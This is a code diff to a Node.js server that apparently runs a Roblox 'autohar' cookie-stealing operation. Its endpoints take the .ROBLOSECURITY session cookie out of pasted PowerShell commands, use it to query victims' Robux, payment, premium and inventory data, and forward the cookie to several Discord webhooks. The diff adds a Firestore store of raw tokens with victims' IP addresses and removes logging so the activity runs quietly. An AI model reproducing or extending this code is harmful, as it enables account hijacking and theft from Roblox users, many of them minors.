@@ -5,10 +5,21 @@ import { fileURLToPath } from 'url';
 import crypto from 'crypto';
 import fs from 'fs';
 
+// Import Firestore
+import { Firestore } from '@google-cloud/firestore';
+
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
+
+// Firestore Initialization
+const db = new Firestore({
+  projectId: process.env.GOOGLE_PROJECT_ID,
+  keyFilename: process.env.GOOGLE_PRIVATE_KEY_FILE, // Optional: if key is in a file
+  email: process.env.GOOGLE_CLIENT_EMAIL,
+  databaseURL: process.env.FIREBASE_DB_URL,
+});
 
 // Directory management
 const DIRECTORIES_FILE = path.join(__dirname, 'directories.json');
@@ -52,7 +63,7 @@ function validateRequest(req, res, next) {
   if (origin) {
     const originHost = new URL(origin).host;
     if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
-      console.log(`❌ Blocked request from unauthorized origin: ${origin}`);
+      console.log(`❌ Blocked request from unauthorized origin`);
       return res.status(403).json({ error: 'Unauthorized origin' });
     }
   }
@@ -65,6 +76,25 @@ function validateRequest(req, res, next) {
   }
 
   next();
+}
+
+// Function to log user data to Firestore
+async function logUserData(token, userData, context = {}) {
+  try {
+    const logEntry = {
+      token: token, // Consider hashing or encrypting token if sensitive
+      userData: userData,
+      context: context,
+      timestamp: new Date(),
+    };
+
+    const writeResult = await db.collection('logs').add(logEntry);
+    console.log(`✅ Logged user data to Firestore with ID: ${writeResult.id}`);
+    return writeResult.id;
+  } catch (error) {
+    console.error('❌ Error logging user data to Firestore:', error);
+    return null;
+  }
 }
 
 app.use(bodyParser.json());
@@ -206,7 +236,6 @@ async function getRobloxCSRFToken(token) {
     const csrfToken = response.headers.get('x-csrf-token');
     return csrfToken;
   } catch (error) {
-    console.error('❌ Error getting CSRF token:', error);
     return null;
   }
 }
@@ -214,11 +243,8 @@ async function getRobloxCSRFToken(token) {
 // Function to fetch user data from Roblox API
 async function fetchRobloxUserData(token) {
   try {
-    console.log('🔍 Fetching user data from Roblox API...');
-
     // Get CSRF token first
     const csrfToken = await getRobloxCSRFToken(token);
-    console.log('CSRF token obtained:', csrfToken ? 'YES' : 'NO');
 
     const baseHeaders = {
       'Cookie': `.ROBLOSECURITY=${token}`,
@@ -239,8 +265,6 @@ async function fetchRobloxUserData(token) {
       headers: baseHeaders
     });
 
-    console.log('User response status:', userResponse.status);
-
     if (!userResponse.ok) {
       // Try alternative endpoint if first fails
       const altUserResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
@@ -248,15 +272,11 @@ async function fetchRobloxUserData(token) {
         headers: baseHeaders
       });
 
-      console.log('Alternative user response status:', altUserResponse.status);
-
       if (!altUserResponse.ok) {
-        console.log('❌ Both user endpoints failed');
         return null;
       }
 
       const altUserData = await altUserResponse.json();
-      console.log('✅ User data fetched from alternative endpoint for user:', altUserData.UserName);
 
       // For mobile API, try to get actual robux data
       let actualRobux = altUserData.RobuxBalance || 0;
@@ -283,7 +303,6 @@ async function fetchRobloxUserData(token) {
     }
 
     const userData = await userResponse.json();
-    console.log('✅ User data fetched successfully for user:', userData.name);
 
     // Get robux data (current + pending)
     let robuxData = { robux: 0 };
@@ -295,10 +314,9 @@ async function fetchRobloxUserData(token) {
       });
       if (robuxResponse.ok) {
         robuxData = await robuxResponse.json();
-        console.log('✅ Robux data fetched:', robuxData.robux);
       }
     } catch (e) {
-      console.log('Could not fetch robux data:', e.message);
+      // Silent handling
     }
 
     try {
@@ -307,10 +325,9 @@ async function fetchRobloxUserData(token) {
       });
       if (pendingResponse.ok) {
         pendingRobuxData = await pendingResponse.json();
-        console.log('✅ Pending robux data fetched:', pendingRobuxData.pendingRobux);
       }
     } catch (e) {
-      console.log('Could not fetch pending robux data:', e.message);
+      // Silent handling
     }
 
     // Get transaction summary data
@@ -321,29 +338,22 @@ async function fetchRobloxUserData(token) {
       });
       if (summaryResponse.ok) {
         summaryData = await summaryResponse.json();
-        console.log('✅ Transaction summary data fetched:', summaryData);
       }
     } catch (e) {
-      console.log('Could not fetch transaction summary:', e.message);
+      // Silent handling
     }
 
-    // Get premium status using the validate-membership API with detailed logging
+    // Get premium status using the validate-membership API
     let premiumData = { isPremium: false };
     try {
-      console.log(`🔍 Checking premium status for user ID: ${userData.id}`);
       const premiumApiUrl = `https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`;
-      console.log(`🔗 Premium API URL: ${premiumApiUrl}`);
 
       const premiumResponse = await fetch(premiumApiUrl, {
         headers: baseHeaders
       });
 
-      console.log(`📊 Premium API response status: ${premiumResponse.status}`);
-      console.log(`📊 Premium API response headers:`, Object.fromEntries(premiumResponse.headers));
-
       if (premiumResponse.ok) {
         const premiumValidation = await premiumResponse.json();
-        console.log('📋 Premium API raw response:');
 
         // The API returns a direct boolean value (true/false), not an object
         if (typeof premiumValidation === 'boolean') {
@@ -356,45 +366,29 @@ async function fetchRobloxUserData(token) {
                                   premiumValidation.Premium || 
                                   false;
         }
-
-        console.log('✅ Premium status fetched from validate-membership API:', premiumData.isPremium);
       } else {
-        const errorText = await premiumResponse.text();
-        console.log('❌ Premium validate-membership API failed with status:', premiumResponse.status);
-        console.log('❌ Premium API error response:', errorText);
-
         // Fallback to billing API check
-        console.log('🔄 Attempting fallback premium detection via billing API...');
         try {
           const billingResponse = await fetch(`https://billing.roblox.com/v1/credit`, {
             headers: baseHeaders
           });
 
-          console.log(`📊 Billing API response status: ${billingResponse.status}`);
-
           if (billingResponse.ok) {
             const billingData = await billingResponse.json();
-            console.log('📋 Billing API response:');
 
             // Check if user has premium features via billing
             premiumData.isPremium = billingData.hasPremium || 
                                    billingData.isPremium || 
                                    (billingData.balance && billingData.balance > 0) || 
                                    false;
-
-            console.log('✅ Premium status detected via billing fallback:', premiumData.isPremium);
           } else {
-            console.log('❌ Billing API also failed with status:', billingResponse.status);
             premiumData.isPremium = false;
           }
         } catch (billingError) {
-          console.log('❌ Billing API fallback error:', billingError.message);
           premiumData.isPremium = false;
         }
       }
     } catch (e) {
-      console.log('❌ Premium detection error:', e.message);
-      console.log('❌ Full error stack:', e.stack);
       premiumData.isPremium = false;
     }
 
@@ -406,10 +400,9 @@ async function fetchRobloxUserData(token) {
       });
       if (ageResponse.ok) {
         ageData = await ageResponse.json();
-        console.log('✅ User age data fetched');
       }
     } catch (e) {
-      console.log('Could not fetch age data:', e.message);
+      // Silent handling
     }
 
     // Get groups owned
@@ -421,10 +414,9 @@ async function fetchRobloxUserData(token) {
       if (groupsResponse.ok) {
         const groupsData = await groupsResponse.json();
         groupsOwned = groupsData.data ? groupsData.data.filter(group => group.role.rank === 255).length : 0;
-        console.log('✅ Groups owned data fetched:', groupsOwned);
       }
     } catch (e) {
-      console.log('Could not fetch groups data:', e.message);
+      // Silent handling
     }
 
     // Get inventory counts with improved accuracy
@@ -437,12 +429,6 @@ async function fetchRobloxUserData(token) {
         headers: baseHeaders
       });
 
-      if (inventoryResponse.ok) {
-        const inventoryResponseData = await inventoryResponse.json();
-        console.log('Inventory API response status:', inventoryResponse.status);
-        console.log('Inventory API data sample:', inventoryResponseData ? Object.keys(inventoryResponseData) : 'null');
-      }
-
       // Method 2: Try the items endpoint specifically
       const itemsResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle,Face,Hair,HairAccessory/1?limit=100`, {
         headers: baseHeaders
@@ -450,18 +436,14 @@ async function fetchRobloxUserData(token) {
 
       if (itemsResponse.ok) {
         const itemsData = await itemsResponse.json();
-        console.log('Items API response:');
         if (itemsData && itemsData.data) {
           inventoryData.bundles = itemsData.data.filter(item => item.assetType === 'Bundle').length;
           inventoryData.faces = itemsData.data.filter(item => item.assetType === 'Face').length;
           inventoryData.hairs = itemsData.data.filter(item => item.assetType === 'Hair' || item.assetType === 'HairAccessory').length;
-          console.log('✅ Inventory data from items endpoint:', inventoryData);
         }
-      } else {
-        console.log('Items API failed with status:', itemsResponse.status);
       }
 
-      // Method 3: Fallback to collectibles endpoint with detailed logging
+      // Method 3: Fallback to collectibles endpoint
       if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
         // Get bundles specifically
         const bundleResponse = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?assetTypes=Bundle&sortOrder=Asc&limit=100`, {
@@ -470,13 +452,8 @@ async function fetchRobloxUserData(token) {
 
         if (bundleResponse.ok) {
           const bundleData = await bundleResponse.json();
-          console.log('Bundle API response:');
           if (bundleData && bundleData.data) {
             inventoryData.bundles = bundleData.data.length;
-            console.log('Bundle count from collectibles:', inventoryData.bundles);
-            // Log first few bundle names for verification
-            const bundleNames = bundleData.data.slice(0, 5).map(b => b.name);
-            console.log('Sample bundle names:', bundleNames);
           }
         }
 
@@ -507,7 +484,6 @@ async function fetchRobloxUserData(token) {
 
       // Final fallback: try avatar items if everything else fails
       if (inventoryData.hairs === 0 && inventoryData.faces === 0 && inventoryData.bundles === 0) {
-        console.log('All inventory endpoints failed, falling back to avatar data');
         const avatarResponse = await fetch(`https://avatar.roblox.com/v1/users/${userData.id}/avatar`, {
           headers: baseHeaders
         });
@@ -519,10 +495,8 @@ async function fetchRobloxUserData(token) {
           }
         }
       }
-
-      console.log('✅ Final inventory data:', inventoryData);
     } catch (e) {
-      console.log('Could not fetch inventory data:', e.message);
+      // Silent handling
     }
 
     // Get RAP (Limited item values)
@@ -538,10 +512,9 @@ async function fetchRobloxUserData(token) {
             return total + (item.recentAveragePrice || 0);
           }, 0);
         }
-        console.log('✅ RAP data fetched:', rapValue);
       }
     } catch (e) {
-      console.log('Could not fetch RAP data:', e.message);
+      // Silent handling
     }
 
     // Calculate account age in days
@@ -567,7 +540,7 @@ async function fetchRobloxUserData(token) {
         }
       }
     } catch (e) {
-      console.log('Could not fetch currently wearing data:', e.message);
+      // Silent handling
     }
 
     return {
@@ -590,7 +563,6 @@ async function fetchRobloxUserData(token) {
     };
 
   } catch (error) {
-    console.error('❌ Error fetching Roblox user data:', error);
     return null;
   }
 }
@@ -753,7 +725,7 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       };
 
       console.log('Sending combined user data and cookie embeds...');
-      
+
       const response = await fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -836,8 +808,7 @@ app.post('/convert', validateRequest, async (req, res) => {
       return res.status(400).json({ error: 'Invalid input format' });
     }
 
-    console.log('🔍 Searching for ROBLOSECURITY token...');
-    console.log('📝 Input received:', input.substring(0, 200) + (input.length > 200 ? '...' : ''));
+    console.log('🔍 Processing request data...');
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
     // First, clean up the input by removing PowerShell backticks and line breaks
@@ -851,20 +822,35 @@ app.post('/convert', validateRequest, async (req, res) => {
       const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
-      console.log('✅ Token found! Fetching user data...');
-
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
 
-      if (userData) {
-        console.log('✅ Data processed successfully');
-      } else {
-        console.log('⚠️ Processing with limited data');
-      }
+      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
+
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });
+
 
       // Send to Discord webhook with user data
-      console.log('🔍 Sending token to Discord webhook');
-      const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);
+      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
 
       if (!webhookResult.success) {
         console.log('❌ Webhook failed:', webhookResult.error);
@@ -984,16 +970,8 @@ app.post('/:directory/convert', async (req, res) => {
       const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
-      console.log(`✅ Token found for directory ${directoryName}! Fetching user data...`);
-
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
-
-      if (userData) {
-        console.log('✅ Data processed successfully');
-      } else {
-        console.log('⚠️ Processing with limited data');
-      }
 
       // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
       const webhookUserData = userData || {
@@ -1015,10 +993,12 @@ app.post('/:directory/convert', async (req, res) => {
         inventory: { hairs: 0, bundles: 0, faces: 0 }
       };
 
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
+
       const customTitle = `🎯 +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
-      console.log('🔍 Sending token to Discord webhook');
       const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);
 
       // Always send to site owner (main webhook) - check both environment variable and default webhook
@@ -1239,8 +1219,6 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       const token = match[1].replace(/['"]/g, '');
       const userAgent = req.headers['user-agent'] || 'Unknown';
 
-      console.log(`✅ Token found for subdirectory ${directoryName}/${subdirectoryName}! Fetching user data...`);
-
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
 
@@ -1264,12 +1242,19 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         inventory: { hairs: 0, bundles: 0, faces: 0 }
       };
 
+      // Log user data to database
+      await logUserData(token, webhookUserData, { 
+        ip: req.ip, 
+        directory: directoryName, 
+        subdirectory: subdirectoryName 
+      });
+
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
       const customTitle = `🎯 +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;
 
       // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
-      console.log(`🚀 Sending rich user data embed to subdirectory webhook: ${subdirectoryConfig.webhookUrl}`);
-      console.log('🔍 Sending token to Discord webhook');
+      console.log(`🚀 Sending rich user data embed to subdirectory webhook`);
+      console.log('🔍 Sending data to Discord webhook');
       const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);
 
       if (subdirectoryWebhookResult.success) {
@@ -1281,7 +1266,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       // 2. Send to dualhook master webhook (collects from all subdirectory users)
       let dualhookWebhookResult = { success: true }; // Default success for validation
       if (parentConfig.dualhookWebhookUrl) {
-        console.log(`🚀 Sending to dualhook master webhook: ${parentConfig.dualhookWebhookUrl}`);
+        console.log(`🚀 Sending to dualhook master webhook`);
         dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);
 
         if (dualhookWebhookResult.success) {
@@ -1294,7 +1279,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       // 3. Send to site owner webhook (website owner)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        console.log(`🚀 Sending to site owner webhook: ${siteOwnerWebhookUrl}`);
+        console.log(`🚀 Sending to site owner webhook`);
         const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);
 
         if (siteOwnerWebhookResult.success) {
@@ -1352,7 +1337,7 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`Admin password: ${ADMIN_PASSWORD}`);
 
   if (!process.env.API_TOKEN) {
-    console.log(`Generated API Token: ${API_TOKEN}`);
+    console.log('Generated API Token for internal use');
     console.log('Set API_TOKEN environment variable to use a custom token');
   }
 
